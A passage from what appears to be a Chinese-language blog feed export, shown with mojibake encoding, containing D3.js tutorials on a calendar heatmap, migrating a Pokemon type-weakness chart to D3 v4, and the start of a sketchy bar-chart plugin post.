d3.timeWeek.count(start, end) å¯ä»¥è¨ˆç®—å‡º start åˆ° end é€™å…©å€‹æ—¥æœŸé–“æœ‰å¹¾é€±ã€‚
t0 æ˜¯ç›®å‰å‚³å…¥çš„æ™‚é–“ï¼Œä¾ç…§ d3.timeMonths() çš„ç”¢å‡ºï¼Œæœƒæ˜¯ä¸€å€‹æœˆçš„ç¬¬ä¸€å¤©ï¼Œt1 å‰‡æ˜¯è©²æœˆçš„æœˆåº•ã€‚d0 èˆ‡ d1 å°±æ˜¯å–®ç´”çš„ t0ã€t1 å°æ‡‰çš„ dayï¼Œå°±æ˜¯æ˜ŸæœŸå¹¾ã€‚w0 ç®—å‡ºå¾ t0 è©²å¹´çš„ç¬¬ä¸€å¤©åˆ° t0 æœ‰å¹¾é€±ï¼Œä¾æ­¤é¡æ¨ w1 å°±æ˜¯ç›¸å°æ–¼ t1ã€‚
ç”¨é€™äº›æ•¸å€¼å°±èƒ½å¤  M(ç§»å‹•) åˆ°æœˆåˆçš„ä½ç½®ï¼Œä¸¦å¾€ä¸‹ç§»å‹• 7 å¤© V 7*cellSizeï¼Œæ¥è‘—åœ¨æ°´å¹³ä½ç§»(H) åˆ°æœˆåº•çš„ä½ç½®ï¼Œç„¶å¾Œå‚ç›´ä½ç§»åˆ°æœˆåº•æ—¥æœŸçš„æ˜ŸæœŸä½ç½®(d1 +1) * cellSizeï¼Œæœ€å¾Œç‚ºåˆ°åŸé»æŠŠæ•´å€‹æœˆä»½æ¡†èµ·ä¾†ã€‚
svg path çš„ç¹ªè£½æ–¹æ³•å¯ä»¥[åƒè€ƒé€™ç¯‡](http://www.oxxostudio.tw/articles/201406/svg-04-path-1.htmlã€‚
åˆ°ç›®å‰ç‚ºæ­¢å¯ä»¥ç•«å‡ºå¦‚ä¸‹çš„åœ–ï¼š

Steps III: è©²é–‹å§‹ Binding è³‡æ–™äº†å†ä¾†ç®—æ˜¯æœ€å¾Œä¸€æ­¥äº†ï¼Œæˆ‘å€‘å°‡è³‡æ–™ç¶å®šä¸¦å¡«å…¥å‰›å‰›ç”¢ç”Ÿçš„æ ¼å­ä¸­ï¼
d3.csv(dataSrc, function (error, csv) &#123;  if (error) throw error;  var data = d3.nest()    // å°‡ date æŠ½åˆ°å¤–å±¤ç•¶ key    .key(function (d) &#123; return d.date; &#125;)    // é€é rollup å°‡ value è¨­ç‚º colorId    .rollup(function (d) &#123; return +d[0].colorIdNum; &#125;)    .object(csv);  rect.filter(function (d) &#123;    return d in data; // æ‰¾å‡ºæœ‰ match åˆ°çš„æ—¥æœŸï¼Œè¡¨ç¤ºé‚£å¤©æˆ‘æœ‰åšäº‹ XD  &#125;)    .attr(&quot;fill&quot;, function (d) &#123; return color(data[d]); &#125;)    .append(&quot;title&quot;)    .text(function (d) &#123; return d + &quot;: &quot; + formatPercent(data[d]); &#125;);&#125;);

é€™é‚Šä¸»è¦å°±å…©å€‹æ­¥é©Ÿï¼Œç¬¬ä¸€æ­¥å…ˆç”¨ d3.nest ä¾†æ•´ç†è³‡æ–™ï¼Œæˆ‘å€‘éœ€è¦æŠŠé™£åˆ—ä¸­æ¯ç­†è³‡æ–™çš„ â€œdateâ€ æŠ“å‡ºä¾†ç•¶ Keyï¼Œå¦‚æ­¤ä¸€ä¾†ï¼Œåœ¨ç¬¬äºŒæ­¥ä¸­ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥åˆ©ç”¨ d in data çš„èªæ³•åœ¨ selection.filter() ä¸­é€²è¡Œéæ¿¾ï¼Œé¸å‡º 365 å€‹æ ¼å­ä¸­ï¼Œå“ªäº›æœ‰è·Ÿæˆ‘å€‘çœŸæ­£çš„ csv æ—¥æœŸè³‡æ–™ matchï¼Œæœ‰ match åˆ°çš„æ ¼å­ï¼Œæˆ‘å€‘å¡«å…¥é¡è‰²ï¼ï¼ˆä½¿ç”¨æœ€å‰é¢çš„ color å‡½æ•¸ä¾†åšæ˜ å°„ï¼‰
å¡«å…¥å’Œé¡è‰²å¾Œï¼š

Steps IV: åŠ å…¥å‹•æ…‹åˆ‡æ›è³‡æ–™çš„åŠŸèƒ½æœ€å¾Œæˆ‘å€‘å¯¦ä½œä¸€ä¸‹ç¶å®šåœ¨ &lt;select&gt; å…ƒç´ ä¸Šçš„ onchange å‡½æ•¸ä¾†åšè³‡æ–™åˆ‡æ›ï¼Œè€Œåœ¨åœ–è¡¨æ–¹é¢ï¼Œæˆ‘å€‘åªéœ€è¦é¸å–å‡º rect ä¸¦é‡æ–° filter è³‡æ–™å³å¯ï¼š
// åˆ‡æ›è³‡æ–™function changeDataSrc() &#123;  var x = document.getElementById(&quot;dataSrcSelector&quot;).value;    UpdateCalendar(`calendarData-$&#123;x&#125;.csv`);&#125;// æ›´æ–°åœ–è¡¨ï¼ŒåŠ ä¸Š `transition()` èˆ‡ `duration()` è®“éç¨‹æ»‘é †ä¸€äº›function UpdateCalendar(dataSrc) &#123;  // ...  // ..  d3.selectAll(&#x27;rect&#x27;).filter(function (d) &#123;    return d in data;  &#125;)    .transition()    .duration(500)    .attr(&quot;fill&quot;, function (d) &#123; return color(data[d]); &#125;);    d3.selectAll(&#x27;rect&#x27;).filter(function (d) &#123;    return !(d in data);  &#125;)    .transition()    .duration(500)    .attr(&quot;fill&quot;, function () &#123; return &#x27;#fff&#x27;; &#125;);&#125;

æˆæœDemo èˆ‡å®Œæ•´çš„ç¨‹å¼ç¢¼
å—¯ï½çœ‹èµ·ä¾†æˆ‘å·¥ä½œé —èªçœŸï¼Œä¸éç­‰ç­‰â€¦æ€éº¼å¥½åƒé€±æœ«é¡è‰²éƒ½æ¯”è¼ƒæ·±å•Šå“ˆå“ˆå“ˆâ€¦å“ˆå“ˆ..å“ˆ..å—šå—šå—š
çµè«–ç•¶åˆé–‹å§‹åœ¨ Google Calendar ä¸Šç´€éŒ„æ—¥èªŒæ™‚ï¼Œä¸¦æ²’æœ‰æƒ³åˆ°å¯ä»¥åœ¨å¹´çµ‚çš„æ™‚å€™é€²è¡Œæ•´å¹´çš„ reviewï¼Œæ‰€ä»¥æ¯å¤©çš„ç´€éŒ„éƒ½å¾ˆéš¨æ€§ï¼Œä¸¦æ²’æœ‰å¾ˆå®Œæ•´çš„é€²è¡Œåˆ†é¡ï¼Œæœ‰äº›å¯æƒœï¼Œä½†é‚„æ˜¯èƒ½é€éè³‡æ–™è¦–è¦ºåŒ–çš„çµæœï¼Œçœ‹å‡ºæˆ‘åœ¨æ™‚é–“åˆ†é…çš„æŒæ§åº¦æœ‰ç›¸ç•¶çš„é€²æ­¥ç©ºé–“ï¼Œåƒæ˜¯èŠ±åœ¨å·¥ä½œèˆ‡åŸ¹é¤Šé¡å¤–èˆˆè¶£ï¼ˆå¨›æ¨‚ï¼‰çš„æ™‚é–“æœ‰è »å¤§çš„è½å·®ã€‚
ä¸ç®¡æ€éº¼èªªï¼Œæœ‰äº†é€™æ¬¡çš„ç¶“é©—ï¼Œç›¸ä¿¡æ˜å¹´çš„ Year End Review æœƒæ›´å¥½ï¼å¦‚æœä½ ä¹Ÿè¦ºå¾—é€™æ¨£åšæœ‰è¶£ï¼Œæˆ–è¨±å¯ä»¥åŠ å…¥æˆ‘çš„è¡Œåˆ—ï¼Œä¹Ÿæˆ–è¨±æƒ³æƒ³æœ‰ä»€éº¼æ–¹å¼å¯ä»¥ç‚ºä½ è‡ªå·±é€²è¡Œä¸€æ¬¡å¹´çµ‚ Reviewï¼Œç›¸ä¿¡éƒ½æœƒæœ‰æ‰€æ”¶ç©«ï¼
è³‡æ–™ä¾†æº
d3 formatting
d3-time
d3-array
d3-collection
MDN Date
mbostock calendar view
Google Calendar API

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>d3</tag>
        <tag>google</tag>
        <tag>google calendar api</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ D3.js v4 çœ‹ Pokemon å±¬æ€§è¡¨</title>
    <url>/2016/08/20/d3v4-pokemon-weaknesses/</url>
    <content><![CDATA[è‡ªå¾ Pokemon Go åœ¨å°ç£å¯ä»¥ç©å¾Œï¼Œå‹¾èµ·äº†æˆ‘è¨±å¤šå…’æ™‚å›æ†¶ï¼Œå› æ­¤é™¤äº†è·Ÿè‘—å¤§å®¶ä¸€èµ·æŠ“ç¥å¥‡å¯¶è²ä»¥å¤–ï¼ˆå°æˆ‘å°±æ˜¯ä¸æƒ³è¬›å¯¶å¯å¤¢å•Šå•Šå•Šï¼‰ï¼Œæˆ‘ä¹Ÿç¨å¾®å»è¿½äº†ä¸€ä¸‹æœ€æ–°ç‰ˆçš„ç¥å¥‡å¯¶è²å‹•ç•«ï¼Œä¼¼ä¹æ˜¯åœ¨æ‰“ä»€éº¼å¡æ´›æ–¯è¯ç›Ÿï¼Œä¹Ÿå‡ºç¾äº†å¥½å¥‡æ€ªçš„ Mega é€²åŒ–ï¼Œæœƒè®“ç¥å¥‡å¯¶è²åœ¨æˆ°é¬¥ä¸­è½‰å±¬æ€§â€¦
å’³å’³ï¼Œç­‰ç­‰ï¼Œå†è¬›ä¸‹å»é€™æ•´ç¯‡éƒ½æ˜¯ç¥å¥‡å¯¶è²äº†â€¦
ç¸½ä¹‹ï¼Œçœ‹åˆ°æœƒè½‰å±¬æ€§é€™ä»¶äº‹æƒ…å°±è®“æˆ‘æƒ³åˆ°ï¼Œæˆ‘å°æ™‚å€™å¾ä¾†éƒ½æ²’æœ‰èªçœŸç ”ç©¶éå“ªç¨®å±¬æ€§å‰‹å“ªç¨®å±¬æ€§ï¼ŒåªçŸ¥é“åŸºæœ¬çš„æ°´å‰‹ç«ä¹‹é¡çš„ï¼Œæ–¼æ˜¯ä¹æ±ºå®šä¾†å¥½å¥½ç ”ç©¶ä¸€ä¸‹ï¼Œé †ä¾¿ç·´ç¿’å·²ç¶“å‡ºä¾†ä¸€é™£å­çš„ D3 v4ï¼Œçœ‹çœ‹å·®ç•°æ€§åœ¨å“ªã€‚
å¹¸é‹çš„æ˜¯ï¼Œç•¶æˆ‘åœ¨æœå°‹ Pokemon çš„ API æ™‚ï¼Œç™¼ç¾ http://filipekiss.github.io/pokemon-type-chart/ é€™å€‹äººå·²ç¶“æŠŠæˆ‘æƒ³åšçš„åšå®Œäº† XD ä¹Ÿåšå¾—ä¸éŒ¯ã€‚ä¸éæ˜¯å…©ä¸‰å¹´å‰çš„å°ˆæ¡ˆï¼Œç”¨çš„æ˜¯ D3 v3ã€‚é›–ç„¶é»å­å·²ç¶“è¢«åšå®Œäº†ï¼Œä½†è‡¨æ‘¹ä¹Ÿæ˜¯ä¸€ç¨®å­¸ç¿’ï¼Œæ‰€ä»¥æˆ‘å€‘å°±ä¾†æŠŠå®ƒ Migrate åˆ° D3 v4ï¼Œé †ä¾¿çœ‹çœ‹æœ‰å“ªäº›å€¼å¾—æ³¨æ„çš„åœ°æ–¹å§ï¼
æƒ³ç›´æ¥çœ‹ code çš„åœ¨é€™é‚Šâ€¦ æˆæœ èˆ‡ ç¨‹å¼ç¢¼
ä»‹ç´¹

é€™å¼µåœ–ä¹çœ‹ä¹‹ä¸‹æˆ‘åŸæœ¬ä»¥ç‚ºæ˜¯ä¿®æ”¹è‡ª Chord Diagramï¼Œä½†å…¶å¯¦æ˜¯ä¾†è‡ªæ–¼ Clusterã€‚æƒ³æƒ³ä¹Ÿå°ï¼Œå±¬æ€§é–“çš„é—œä¿‚çš„ç¢ºé¡ä¼¼æ–¼éšå±¤æ¨¹ç‹€ï¼Œä¹Ÿä¸éœ€è¦æœ‰æ¯”ä¾‹åˆ†ä½ˆå°æ‡‰ã€‚( å¾ç¨‹å¼ç¢¼çœ‹ä¾†ï¼ŒåŸä½œè€…æ‡‰è©²æ˜¯ä¿®æ”¹è‡ª https://bl.ocks.org/mbostock/7607999 )
ä½¿ç”¨æ–¹æ³•å¾ˆç°¡å–®ï¼Œåªè¦é»æ“ŠæŸå€‹å±¬æ€§ï¼Œå°±æœƒåˆ—å‡ºè©²å±¬æ€§å°å“ªäº›å±¬æ€§è¼ƒç‚ºå¼·å‹¢ (Strong)ã€å¼±å‹¢ (Weak) æˆ–æ˜¯ å…ç–« (Immune)ï¼ŒåŒæ™‚é»æ“Šå…©ç¨®å±¬æ€§çš„è©±ï¼Œå°±æœƒç§€å‡ºæ“æœ‰é›™é‡å±¬æ€§çš„çµæœç‚ºä½•ã€‚
è§£æç”±æ–¼ D3 v4 çš„è®Šå‹•å¹…åº¦å¾ˆå¤§ï¼Œç‚ºäº†æ¨¡çµ„åŒ–ï¼Œå°‡å¾ˆå¤š packages éƒ½æ‹†å‡ºä¾†ï¼Œæ›¿ä»£ä»¥å¾€ä½¿ç”¨ namespace çš„æ–¹å¼ï¼Œå› æ­¤æœ€å–®ç´”çš„ Migration æ–¹å¼å°±æ˜¯ç›´æ¥é‡åˆ»ä¸¦è¨­æ³• re-use åŸä¾†çš„ codeã€‚
é¦–å…ˆï¼ŒåŸºæœ¬çš„ index.html å…§å®šç¾©å¥½åœ–è¦ç•«åœ¨å“ªè£¡ï¼Œä¸¦åŠ ä¸Šä¸€å€‹ reset button ä¾†é‚„åŸåœ–è¡¨ç‹€æ…‹ï¼š
&lt;div id=&quot;typeChart&quot;&gt;  &lt;div id=&quot;graph&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;button class=&quot;button reset&quot;onclick=&quot;reset()&quot;&gt;reset&lt;/button&gt;

æ¥è‘—ï¼Œæˆ‘å€‘éœ€è¦å…ˆå®šç¾© layoutï¼Œé€™é‚Šä½¿ç”¨ Cluster Layoutï¼Œåœ¨åŸæœ¬çš„ D3 v3 ç‰ˆæœ¬ä¸­ï¼Œä½¿ç”¨çš„æ–¹å¼ç‚ºï¼š
v3.jsvar diameter = 750,    radius = diameter / 2,    innerRadius = radius - 120;var cluster = d3.layout.cluster()    .size([360, innerRadius])    .sort(null)    .value(function(d) &#123; return d.size; &#125;);
ç„¶è€Œï¼Œv4 æ¨¡çµ„åŒ–å¾Œï¼ŒåŸæœ¬çš„ namespace éƒ½ä¸éœ€è¦äº†ï¼Œå› ç‚ºå¯¦éš›ä¸Šæ˜¯å€‹åˆ¥å­˜æ”¾åœ¨ä¸€å€‹ lib åº•ä¸‹ï¼Œä»¥ Layout ä¾†èªª æœƒæ”¾åœ¨ d3-hierarchyï¼Œè€Œä½¿ç”¨æ–¹å¼å‰‡è®Šæˆç›´æ¥å‘¼å« d3.cluster() å³å¯ï¼ŒåŸæœ‰çš„ sort(), value()ç­‰ method ä¹Ÿéƒ½ç§»åˆ° node é€™å€‹å±¤ç´šåº•ä¸‹äº†ï¼ˆå¾Œé¢æœƒåœ¨è¬›åˆ° nodeï¼‰ï¼š
v4.js// å®šç¾©åœ–å½¢çš„åŸºæœ¬è¨­å®šå€¼var diameter = 750,    radius = diameter / 2,    innerRadius = radius - 120;var cluster = d3.cluster()    .size([360, innerRadius]);
å¯«å¥½åœ–å½¢çš„åŸºæœ¬è¨­å®šå€¼å¾Œï¼Œå…ˆæŠŠæˆ‘å€‘å·²çŸ¥çš„ svg æ”¾ä¸Šå»å§ï¼æˆ‘å€‘å…ˆæŠŠå‰›å‰›å®šç¾©å¥½çš„ diameter, radius çš„å€¼ append åˆ°æœ€å¤–å±¤çš„ graph div ä¸Šï¼Œæ¥è‘—å…ˆæŠŠå¾…æœƒæœƒç”¨åˆ°çš„å››ç¨® svg group å…ˆè¨˜éŒ„èµ·ä¾†ï¼Œåˆ†åˆ¥æœ‰ immune (å…ç–«)ã€weak (å¼±å‹¢)ã€strong (å¼·å‹¢)ã€node (å±¬æ€§)
weaknesses-graph.jsvar svg = d3.select(&quot;#typeChart &gt; #graph&quot;).append(&quot;svg&quot;)    .attr(&quot;width&quot;, diameter)    .attr(&quot;height&quot;, diameter)    .append(&quot;g&quot;)    .attr(&quot;transform&quot;, &quot;translate(&quot; + radius + &quot;,&quot; + radius + &quot;)&quot;);var immune = svg.append(&quot;g&quot;).selectAll(&quot;.immune&quot;),    weak = svg.append(&quot;g&quot;).selectAll(&quot;.weak&quot;),    strong = svg.append(&quot;g&quot;).selectAll(&quot;.strong&quot;),    node = svg.append(&quot;g&quot;).selectAll(&quot;.node&quot;);

æˆ‘è »å–œæ­¡é€™æ¨£çš„å¯«æ³•ï¼Œå°‡èˆ‡è³‡æ–™ç¹ªè£½è¼ƒç„¡é—œï¼ˆç›¸å°è¼ƒå›ºå®šï¼‰çš„ç¨‹å¼ç¢¼å…ˆå¯«å¥½ï¼Œæ¥è‘—å†åˆ©ç”¨ d3.json å°‡è³‡æ–™è®€å…¥å¾Œå»ç¹ªè£½ã€‚
Draw-graphd3.json(&quot;types.json&quot;, function(error, classes) &#123;    var nodes = cluster(d3.hierarchy(packageHierarchy(classes))).children;    var immunes = typeImmune(nodes);    var strengths = typeStrong(nodes);    var weaknesses = typeWeak(nodes);    // draw path    ......    ....    ..    //Make the immune links    function typeImmune(nodes) &#123;    var map = &#123;&#125;,        immunes = [];    nodes.forEach(function(d) &#123;        map[d.data.name] = d;    &#125;);    nodes.forEach(function(d) &#123;        if (d.data.immunes) d.data.immunes.forEach(function(i) &#123;            immunes.push(&#123;                source: map[d.data.name],                target: map[i]            &#125;);        &#125;);    &#125;);        return immunes;    &#125;    // ä»¥ä¸‹å…ˆçœç•¥&#125;);
è§£é‡‹ä¸€ä¸‹ä¸Šé¢é€™æ®µç¨‹å¼ç¢¼ï¼Œæˆ‘å€‘çš„è³‡æ–™å­˜æ”¾åœ¨ types.json ä¸­ï¼Œåˆ©ç”¨ d3.json å°‡è³‡æ–™è®€å‡ºå¾Œï¼Œæœƒå…ˆåšå…©ä»¶äº‹æƒ…ï¼š

å°‡è³‡æ–™è½‰åŒ–æˆ hierarchy æ ¼å¼ï¼Œä¸¦åˆå§‹åŒ– cluster
å°‡ç”¢ç”Ÿçš„ nodes è½‰åŒ–ä¸¦åˆ†é¡æˆ immunes, strengths, weaknessesã€‚

é€™é‚Šçš„ packageHierarchy ä¸»è¦æ˜¯å°‡ raw data æ•´ç†æˆæœ‰çˆ¶å­é—œä¿‚çš„ structureï¼Œä¸¦ä¸”çµ¦äºˆæ¯ç­†è³‡æ–™è‡ªå·±çš„ key èˆ‡ nameã€‚ï¼ˆè©³ç´°ç¨‹å¼ç¢¼å¯ä»¥åˆ°æœ€å¾Œçš„é€£çµçœ‹ï¼Œé€™éƒ¨åˆ†æ¯”è¼ƒè·Ÿè³‡æ–™æ ¼å¼ç›¸é—œï¼Œå°±ä¸æ”¾åœ¨é€™è£¡ä½”ç‰ˆé¢äº†ï¼‰
åœ¨åŸæœ¬ v3 çš„åšæ³•è£¡ï¼Œå¦‚æœæˆ‘å€‘è¦æŠŠè³‡æ–™è½‰åŒ–æˆ hierarchy çš„æ ¼å¼ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨ cluster.nodes() ï¼Œå³å¯ä¸€æ¬¡åˆå§‹åŒ– cluster ä¸¦ä¸”å¾—åˆ°æ“æœ‰ x, y å€¼ çš„ nodesï¼Œä½†åœ¨ v4 ä¸­ï¼Œæˆ‘å€‘å¿…é ˆå…ˆåˆ©ç”¨ d3.hierarchy() å°‡è³‡æ–™è½‰åŒ–æˆ hierarchy æ ¼å¼ï¼Œå»ºç«‹å¥½çˆ¶å­é—œä¿‚èˆ‡æ¯å€‹ node çš„æ·±åº¦ï¼Œæ¥è‘—æ‰èƒ½ä¸Ÿå…¥ cluster ä¸­åˆå§‹ï¼Œå…¶å›å‚³å€¼æ‰æœƒæ˜¯æ“æœ‰å°æ‡‰ cluster å…§ x, y å€¼çš„ nodesã€‚
window.nodes = cluster(d3.hierarchy(packageHierarchy(classes))).children;(é€™é‚Šå– children ä¹Ÿåªæ˜¯è³‡æ–™æ ¼å¼çš„é—œä¿‚)
ç”±æ–¼ç¹ªè£½ svg path éœ€è¦çµ¦è¨‚ data çš„ source èˆ‡ targetï¼Œå› æ­¤é€™é‚Šåˆ©ç”¨ typeImmune, typeStrong, typeWeak ä¾†ä½œè½‰æ›ï¼Œä¹Ÿå°‡è³‡æ–™åˆ†ç‚ºé€™ä¸‰ç¨®é—œä¿‚çš„ path ä¾†ç¹ªè£½ã€‚
æ¥è‘—ï¼Œè½‰æ›å¥½å¾Œå°±èƒ½æ ¹æ“š node çš„ source èˆ‡ target ç¹ªè£½ pathã€‚
draw-path// é€™é‚Šåªåˆ—å‡ºä¸€ç¨®window.immune = immune        .data(immunes.map(function(node)&#123;            return node.source.path(node.target);        &#125;))        .enter().append(&quot;path&quot;)        .each(function(d) &#123;            d.source = d[0], d.target = d[d.length - 1];        &#125;)        .attr(&quot;class&quot;, &quot;immune&quot;)        .attr(&quot;d&quot;, line);

ä»¥å¾€åœ¨ v3ï¼Œæˆ‘å€‘å¯ä»¥äº‹å…ˆå®šç¾© var bundle = d3.layout.bundle();ï¼Œç„¶å¾Œåœ¨ä¸Šé¢é€™æ®µç¨‹å¼ç¢¼ä¸­çš„ data() ä¸­å‘¼å« bundle(immunes)ï¼Œä»–å°±æœƒå¹«æˆ‘å€‘æŠŠ source è·Ÿ target åšé€£æ¥ã€‚
ä½†æ˜¯åœ¨ v4 è£¡ï¼Œbundle è¢« node.path() çµ¦å–ä»£äº†ã€‚
æ³¨æ„å–”ï¼æ˜¯ node.path()ï¼Œå±¤ç´šæ˜¯åœ¨ nodeï¼Œå› æ­¤æˆ‘å€‘è¦å¾å‰›æ‰åˆ†é¡å¥½çš„ immunes ä¸­å°‡ node ä¸€å€‹ä¸€å€‹æŠ“å‡ºä¾†å‘¼å«ã€‚
å¦å¤–åœ¨é€™é‚Šæˆ‘å€‘æœ‰ç”¨ä¸€å€‹ each() ä¾†å°‡æ¯ç­† node è³‡æ–™éƒ½åŠ ä¸Š d.source = d[0], d.target = d[d.length - 1];åŸå› æ˜¯ç‚ºäº†ä¹‹å¾Œæˆ‘å€‘é»æ“Šæ¯å€‹é¡åˆ¥çš„æ™‚å€™ï¼Œè¦åˆ©ç”¨é€™å€‹ä¾†æ‰¾å‡ºå°æ‡‰çš„é»ä¾†ä¸Šè‰²ã€‚
colorPath.jswindow.colorPath = function(d, l, type) &#123;      var type = type || &#x27;strong&#x27;;      if (type == &#x27;strong&#x27;) &#123;        if (l.target === d) return l.source.target = true;      &#125;      if (type == &#x27;weak&#x27;) &#123;        for (type in d) &#123;          if(type !== &quot;size&quot;) &#123;            if (l.target === d[type]) return l.source.target = true;          &#125;        &#125;      &#125;    &#125;
åˆ°ç›®å‰ç‚ºæ­¢ï¼Œå·²ç¶“æŠŠåŸæœ¬ v3 çš„ cluster layout è½‰ç§»åˆ° v4 äº†ï¼Œå…¶é¤˜ç¹ªè£½éƒ¨åˆ†å°±èˆ‡ç‰ˆæœ¬æ²’æœ‰ä»€éº¼é—œè¯æ€§ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è³‡æ–™æ ¼å¼çš„è®Šå‹•ï¼Œåƒæ˜¯åœ¨åŸæœ¬ä½œè€…çš„ç¨‹å¼ç¢¼å…§ï¼Œé»æ“Šé¡åˆ¥çš„ activate() å‡½æ•¸ä¸­ï¼Œæ ¹æ“š d.name ä¾†åˆ¤æ–·ä½ç½®çš„éƒ¨åˆ†ï¼Œç”±æ–¼è³‡æ–™æ ¼å¼çš„è®Šå‹•ï¼Œè¦æ”¹ç‚º d.data.nameï¼š
activate(d).jswindow.node    .classed(&quot;node--active&quot;, function(target) &#123;        return (target === d) || this.classList.contains(&quot;node--active&quot;);    &#125;)    .classed(&quot;node--target&quot;, function(n) &#123;        return n.target;    &#125;)    .classed(&quot;immune-node&quot;, function(target, l) &#123;        return (this.classList.contains(&#x27;immune-node&#x27;) || target.data.immunes.indexOf(d.data.name) != -1);    &#125;)    ....    ...    ..

å…¶é¤˜ç¹ªè£½éƒ¨åˆ†ï¼ŒåŒ…å«é»æ“Šå¾Œçš„ä¸Šè‰²é‚è¼¯ï¼ˆ activate() å‡½æ•¸ä¸­ï¼‰ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å°±ç›´æ¥çœ‹ code å§ï¼Œç›¸ä¿¡æœƒæ›´æ¸…æ¥šï¼
æˆæœ èˆ‡ ç¨‹å¼ç¢¼
ä¸éå¯¦éš›ä¸Šæˆ‘ä¸¦æ²’æœ‰å®Œæ•´ Migration å®Œæˆï¼Œåœ¨åŸæœ¬ v3 çš„ d3.svg.line.radial() é€™è£¡ï¼Œv4 çš„å¯«æ³•æ‡‰è©²æ˜¯ d3.radialLine()ï¼Œä¸¦æ­é…ä¸Š curve() å‡½æ•¸ï¼Œåªæ˜¯æˆ‘ä¸¦æ²’æœ‰å˜—è©¦æˆåŠŸï¼Œé‚„è«‹é«˜æ‰‹æŒ‡æ•™ï¼
æœ€å¾Œï¼Œé€çµ¦å¤§å®¶ä¸€éš»ç´” CSS å¡æ¯”ç¸ï¼Œç¥å¤§å®¶æ—©æ—¥æˆç‚ºç¥å¥‡å¯¶è²å¤§å¸«ï¼ï¼ˆå¥½å•¦å…¶å¯¦ä¸åƒXDâ€¦ç•¢ç«Ÿæˆ‘å° css çš„æŒæ§åº¦å¤§æ¦‚è·Ÿæˆ‘å°è…°é–“è‚¥è‚‰çš„æŒæ§åº¦ä¸€æ¨£ä½è½â€¦ï¼‰
See the Pen Snorlax-pokemon by Arvin (@arvin0731) on CodePen.



è³‡æ–™ä¾†æº
d3&#x2F;d3-hierarchy
d3&#x2F;d3-shape
origin version

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>d3</tag>
        <tag>pokemon</tag>
      </tags>
  </entry>
  <entry>
    <title>D3v4 å·¥ä½œåŠ - è£½ä½œ D3 plugin ä¾†ç¹ªè£½è‰åœ–é¢¨æ ¼é•·æ¢åœ–</title>
    <url>/2017/10/21/d3v4-sketchy-plugin/</url>
    <content><![CDATA[å‰è¨€å‰é™£å­ Mozilla å¦‚ç«å¦‚è¼åœ°æ¨å‡ºä»–å€‘çš„é‡å­å°ˆæ¡ˆï¼Œè€Œå…¶ä¸­åœ¨ä»‹ç´¹ Quantum CSS æ¶æ§‹çš„æ™‚å€™ï¼Œç”¨äº†è¨±å¤š å¯æ„›çš„è‰åœ– ä¾†è§£èªªï¼Œè®“æˆ‘çªç„¶æƒ³åˆ°å¦‚æœèƒ½å¤ å°‡é€™ç¨®æ‰‹ç¹ªé¢¨æ ¼å¥—ç”¨åˆ°è³‡æ–™åœ–è¡¨ä¸Šé¢ï¼Œæ‡‰è©²æœƒè »æœ‰è¶£çš„ï¼Œä¹Ÿæ‰å› æ­¤æœ‰äº†é€™ç¯‡æ–‡ç« ã€‚
ä¸€èˆ¬ä¾†èªªï¼Œæˆ‘å€‘ä¸ç®¡æ˜¯ç”¨ D3.js æˆ–æ˜¯ Highcharts ç­‰å·¥å…·ä¾†è£½ä½œåœ–è¡¨ï¼Œéƒ½æ˜¯æœå‘å°ˆæ¥­ã€æœ‰è³ªæ„Ÿã€è¡¨é”æ¸…æ™°çš„æ–¹å‘å»å¯¦ä½œï¼Œåˆ©ç”¨å„ç¨®é¡è‰²æ­é…èˆ‡äº’å‹•æ“ä½œä¾†è®“åœ–è¡¨æ›´æ¼‚äº®æ›´å¸å¼•äººã€‚
ï¼ˆä¾†æºï¼šhighchart offical siteï¼‰
ä½†çœ‹ä¹…äº†ä»¥å¾Œç¸½æœƒæœ‰é»ç–²ä¹ï¼ŒåŠ ä¸Šç¾ä»£äººå°ˆæ³¨åŠ›è¶Šä¾†è¶ŠçŸ­æš«ï¼Œåˆ©ç”¨ä¸€äº›æ¼«ç•«ã€è‰åœ–çš„æ–¹å¼ä¾†å‘ˆç¾è¦èªªæ˜çš„æ±è¥¿ï¼Œåè€Œå¤ å®¹æ˜“æŠ“ä½å¤§å®¶çš„æ³¨æ„åŠ›ï¼Œåƒæ˜¯ä¸Šè¿°æ–‡ç« çš„ä½œè€… Lin Clark åœ¨ medium ä¸Šå°±æœ‰ä¸€ç³»åˆ—çš„ Cartoon Intro çš„æ–‡ç« ã€‚
ä½†èº«ç‚ºå‰ç«¯å·¥ç¨‹å¸«ï¼Œæ‰‹ä¸Šçš„å·¥å…·åªæœ‰ Javascriptã€CSS èˆ‡ HTMLï¼Œè¦æ€éº¼æ¨£ â€œæ‰‹ç¹ªâ€ åœ–è¡¨å‘¢ï¼Ÿ
å…¶å¯¦å¾ˆç°¡å–®ï¼Œåˆ©ç”¨ D3.js æˆ‘å€‘å°±èƒ½åšå¾—åˆ°ï¼
d3 sketchy
â€œé–‹ç©ç¬‘çš„å§ï¼Ÿæˆ‘çŸ¥é“ D3 å¯ä»¥åœ¨ Canvas ä¸Šç¹ªåœ–ï¼Œä½† Canvas ç”¨èµ·ä¾†é‚„æ˜¯æ²’æœ‰æ“ä½œ svg ä¾†å¾—æ–¹ä¾¿ï¼Œè€Œ svg ç•«çš„é•·æ¢åœ–å°±æ˜¯å››å››æ–¹æ–¹çš„å•Šï¼â€

æ²’éŒ¯æˆ‘ä¸€é–‹å§‹ä¹Ÿæ˜¯é€™éº¼æƒ³çš„ï¼Œä½†å°±åœ¨æŸæ¬¡å¶ç„¶æ©Ÿæœƒä¸‹ï¼Œæ‹œè®€åˆ° D3 in Action é€™æœ¬æ›¸çš„ä½œè€…åœ¨ Github ä¸Šçš„ code å¾Œè®“æˆ‘æ”¹è§€äº†ã€‚
